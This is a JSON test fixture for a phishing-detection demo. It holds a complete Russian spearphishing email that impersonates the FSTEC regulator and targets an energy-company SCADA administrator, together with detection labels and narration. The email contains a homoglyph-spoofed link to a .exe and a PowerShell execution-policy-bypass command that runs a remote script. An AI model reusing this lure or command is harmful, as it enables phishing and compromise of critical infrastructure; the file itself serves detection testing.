@@ -1,0 +1,82 @@
+{
+  "id": "demo-russian-apt-001",
+  "name": "Russian APT Spearphishing — Energy Infrastructure Targeting",
+  "act": 5,
+  "demo_timing": {
+    "submit_at_seconds": 300,
+    "expected_pipeline_seconds": 22,
+    "narration_start": "An APT-grade threat in Russian targeting energy infrastructure. This is state-level sophistication."
+  },
+  "threat": {
+    "content_type": "email",
+    "source": "email",
+    "subject": "Обновление протокола безопасности SCADA — требуется немедленное действие",
+    "sender": {
+      "display_name": "Центр кибербезопасности энергетического сектора",
+      "email": "cert@energo-security.gov.ru",
+      "spoofed_domain": "energo-securitу.gov.ru",
+      "homoglyph_note": "Cyrillic 'у' (U+0443) used instead of Latin 'y' (U+0079) in 'security' — same Unicode homoglyph class as Arabic threat"
+    },
+    "recipient": {
+      "display_name": "Иванов Алексей Петрович",
+      "role": "SCADA Systems Administrator",
+      "organization": "Южная энергетическая компания (Southern Energy Company)"
+    },
+    "headers": {
+      "reply_to": "energo.cert.ru@yandex.com",
+      "x_originating_ip": "5.188.86.172",
+      "received_from": "relay.protected-comms.xyz"
+    },
+    "body": "Уважаемый Алексей Петрович,\n\nЦентр кибербезопасности энергетического сектора Российской Федерации (ЦКБ-ЭС) направляет вам экстренное уведомление.\n\nВ рамках расследования инцидента безопасности, проведённого совместно с ФСБ России и ФСТЭК, была выявлена критическая уязвимость в промышленных контроллерах серии Siemens SIMATIC S7-1500, которые используются в вашей инфраструктуре.\n\n【Детали уязвимости】\n• Идентификатор: CVE-2025-31337\n• Тип: Удалённое выполнение кода через протокол S7comm\n• CVSS v3.1: 10.0 (Критический)\n• Статус: Активная эксплуатация подтверждена\n• Атрибуция: APT группировка «Песчаный Червь» (Sandworm)\n\n【Необходимые действия】\nВ соответствии с Приказом ФСТЭК №239, вы обязаны:\n\n1. Установить экстренное обновление для SCADA-систем:\n   https://energo-securitу.gov.ru/patches/simatic-s7-emergency-2025.exe\n\n2. Запустить диагностический скрипт для проверки компрометации:\n   powershell -ExecutionPolicy Bypass -File https://energo-securitу.gov.ru/diagnostic/check-s7.ps1\n\n3. Предоставить отчёт о выполнении в течение 48 часов\n\nНЕВЫПОЛНЕНИЕ данного предписания является нарушением Федерального закона №187-ФЗ «О безопасности критической информационной инфраструктуры» и может повлечь за собой:\n• Административную ответственность (штраф до 500,000 руб.)\n• Уголовную ответственность (ст. 274.1 УК РФ — до 10 лет)\n• Отзыв лицензии на эксплуатацию объектов КИИ\n\nДля получения технической поддержки:\nТелефон: +7 (495) 587-44-00 (круглосуточно)\nЗащищённый канал: Signal +7 (985) 123-4567\n\nС уважением,\n\nПолковник Сергей Николаевич Козлов\nЗаместитель начальника ЦКБ-ЭС\nФСТЭК России\nБольшая Лубянка, д. 2, Москва\n\nДанное сообщение содержит информацию, составляющую государственную тайну. Несанкционированное распространение преследуется по закону.",
+    "body_english_gloss": "Dear Alexey Petrovich,\n\nThe Cybersecurity Center of the Energy Sector of the Russian Federation (CKB-ES) sends you an emergency notification.\n\nAs part of a security incident investigation conducted jointly with FSB and FSTEC of Russia, a critical vulnerability has been identified in Siemens SIMATIC S7-1500 industrial controllers used in your infrastructure.\n\n[Vulnerability Details]\n• ID: CVE-2025-31337\n• Type: Remote code execution via S7comm protocol\n• CVSS v3.1: 10.0 (Critical)\n• Status: Active exploitation confirmed\n• Attribution: APT group 'Sandworm'\n\n[Required Actions]\nIn accordance with FSTEC Order No. 239, you are required to:\n\n1. Install emergency update for SCADA systems: [spoofed URL .exe]\n2. Run diagnostic script to check for compromise: [PowerShell bypass command]\n3. Submit execution report within 48 hours\n\nNON-COMPLIANCE with this directive violates Federal Law No. 187-FZ 'On Security of Critical Information Infrastructure' and may result in:\n• Administrative liability (fine up to 500,000 rubles)\n• Criminal liability (Art. 274.1 Criminal Code — up to 10 years)\n• Revocation of CII operating license\n\nFor technical support:\nPhone: +7 (495) 587-44-00 (24/7)\nSecure channel: Signal +7 (985) 123-4567\n\nRespectfully,\n\nColonel Sergey Nikolaevich Kozlov\nDeputy Head of CKB-ES\nFSTEC of Russia\nBolshaya Lubyanka, 2, Moscow\n\nThis message contains information constituting state secrets. Unauthorized distribution is prosecuted by law.",
+    "social_engineering_markers": {
+      "authority": "Impersonates FSTEC (real Russian cybersecurity regulator) AND invokes FSB (intelligence service). Colonel rank. Bolshaya Lubyanka address (real FSB headquarters).",
+      "urgency": "Active exploitation by Sandworm (real APT group). 48-hour compliance window.",
+      "fear": "Criminal prosecution (10 years), license revocation, 500K ruble fine. 'State secrets' classification makes even discussing the email feel illegal.",
+      "technical_credibility": "Real Siemens SIMATIC S7-1500 (widely used in energy SCADA). Real protocol (S7comm). Fabricated but realistic CVE with perfect CVSS 10.0. PowerShell bypass command is a real attack technique.",
+      "multi_stage_payload": "Two payloads: a .exe binary AND a PowerShell script with -ExecutionPolicy Bypass — classic living-off-the-land attack. If either executes, attacker has remote code execution on SCADA infrastructure.",
+      "cultural_context": "In Russia, FSTEC directives carry legal force. Non-compliance with CII security requirements is a criminal offense (this is REAL law). The email weaponizes regulatory compliance system itself."
+    }
+  },
+  "expected_results": {
+    "language_detected": "ru",
+    "language_name": "Russian",
+    "code_switch_detected": true,
+    "code_switch_details": "Russian body with English technical terms (SCADA, CVE, CVSS, PowerShell, S7comm, Sandworm, Signal)",
+    "homoglyphs_detected": true,
+    "homoglyph_details": "Cyrillic у (U+0443) substituted for Latin y (U+0079) in domain — third instance of cross-script homoglyph attack in this demo",
+    "classification": "novel",
+    "severity": "critical",
+    "surprise_bits": 9.8,
+    "attack_family": "APT_SCADA_Infrastructure",
+    "attack_techniques": ["T1566.001", "T1059.001", "T1036.005", "T1071.001", "T1562.001"],
+    "mitre_mapping": {
+      "T1566.001": "Phishing: Spearphishing Attachment",
+      "T1059.001": "Command and Scripting Interpreter: PowerShell",
+      "T1036.005": "Masquerading: Match Legitimate Name or Location",
+      "T1071.001": "Application Layer Protocol: Web Protocols",
+      "T1562.001": "Impair Defenses: Disable or Modify Tools"
+    },
+    "confidence_text": 0.96,
+    "confidence_fused": 0.96,
+    "se_scores": {
+      "urgency": 0.93,
+      "authority": 0.98,
+      "fear": 0.96,
+      "financial_request": 0.10,
+      "isolation": 0.55,
+      "impersonation": 0.97
+    },
+    "financial_exposure": {
+      "direct": "Unknown (SCADA compromise — critical infrastructure)",
+      "indirect": "Potential blackout affecting millions. Colonial Pipeline cost: $4.4M ransom + $1B+ economic impact",
+      "note": "SCADA attacks are classified as potential acts of war under Tallinn Manual 2.0"
+    }
+  },
+  "demo_narration": {
+    "on_submit": "Now we escalate to nation-state level. A Russian APT spearphish targeting SCADA infrastructure at an energy company. It impersonates FSTEC — Russia's real cybersecurity regulator — and invokes FSB. The PowerShell command is a real living-off-the-land technique.",
+    "on_detection": "Surprise: 9.8 bits — highest in our demo. NOVEL and CRITICAL. IMMUNIS detects the PowerShell bypass, spoofed .gov.ru domain, and Cyrillic homoglyph. Third time this session it has caught cross-script homoglyphs.",
+    "on_mapping": "MITRE ATT&CK maps to 5 techniques including T1059.001 PowerShell and T1562.001 Defense Impairment. The kill chain is clear: phish → execute → persist → control SCADA.",
+    "mind_blow": "IMMUNIS detected a cross-script homoglyph pattern it learned from SESOTHO threat and applied it to RUSSIAN Cyrillic. Different language family, different script, different continent — same immune memory. And it flagged PowerShell execution policy bypass as a MITRE technique. This is not pattern matching — this is understanding."
+  }
+}
